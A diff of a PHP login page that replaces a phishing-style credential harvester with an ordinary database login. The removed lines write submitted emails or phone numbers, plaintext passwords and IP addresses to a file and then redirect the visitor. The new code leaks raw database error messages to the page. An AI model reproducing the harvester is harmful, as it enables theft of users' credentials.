@@ -1,49 +1,67 @@
 <?php
-error_reporting(E_ALL);
-ini_set('display_errors', 1);
 session_start();
+include 'db.php'; // Ensure db.php contains the PDO database connection
+
 $error = "";
 
-if ($_SERVER['REQUEST_METHOD'] == 'POST') {
-    // Retrieve form data
-    $email_phone = trim($_POST['email_phone']);
+// Process login
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $username = trim($_POST['username']);
     $password = trim($_POST['password']);
 
-    // Check if inputs are empty
-    if (empty($email_phone) || empty($password)) {
-        $error = "Email or phone number and password cannot be empty.";
-    } else {
-        // Validate email or phone number
-        if (filter_var($email_phone, FILTER_VALIDATE_EMAIL) || preg_match("/^[0-9]{10,15}$/", $email_phone)) {
-            // Validate password strength
-            $letterCount = preg_match_all('/[a-zA-Z]/', $password); // Count letters (both upper and lower case)
-            $numberCount = preg_match('@[0-9]@', $password);        // Check for numbers
-            $specialChars = preg_match('@[^\w]@', $password);        // Check for special characters
-
-            // Validate if the password has exactly 6 letters and contains at least one number and one special character
-            if ($letterCount === 6 && $numberCount >= 1 && $specialChars >= 1) {
-                // Get user IP address, date, and time
-                $ip_address = $_SERVER['REMOTE_ADDR'];
-                $date_time = date('Y-m-d H:i:s'); // Format: YYYY-MM-DD HH:MM:SS
-
-                // Prepare the data to save
-                $data = "Email/Phone: $email_phone, Password: $password, IP: $ip_address, Date/Time: $date_time\n";
-                file_put_contents('password-save.php', $data, FILE_APPEND);
-                
-                // Redirect to 1xbet.com
-                header('Location: hlo.html'); 
-                exit;
+    try {
+        // Retrieve user from the database using PDO
+        $sql = "SELECT * FROM users WHERE username = :username";
+        $stmt = $pdo->prepare($sql); // Use $pdo here
+        $stmt->bindParam(':username', $username);
+        $stmt->execute();
+        
+        // Check if the user exists
+        if ($stmt->rowCount() > 0) {
+            $row = $stmt->fetch(PDO::FETCH_ASSOC);
+            // Verify password
+            if (password_verify($password, $row['password'])) {
+                $_SESSION['logged_in'] = 1;
+                $_SESSION['username'] = $username;
+                header("Location: index.php");
+                exit();
             } else {
-                $error = "Password must contain exactly 6 letters, at least one number, and one special character.";
+                $error = "Invalid credentials.";
             }
         } else {
-            $error = "Please enter a valid email address or phone number.";
+            $error = "User not found.";
         }
+    } catch (PDOException $e) {
+        $error = "Error: " . $e->getMessage();
     }
 }
-
-// Display error messages if any
-if (!empty($error)) {
-    echo "<div style='color: red;'>$error</div>";
-}
 ?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Np0m Official</title>
+    <link rel="stylesheet" href="css/index.css">
+</head>
+<body>
+    <div class="login-container">
+        <h2>Login to Np0m</h2>
+        <?php if ($error): ?>
+            <p style="color: red;"><?php echo $error; ?></p>
+        <?php endif; ?>
+        <form action="login.php" method="POST">
+            <div class="input-group">
+                <label for="username">Username:</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            <div class="input-group">
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <button type="submit">Login</button>
+        </form>
+    </div>
+</body>
+</html>
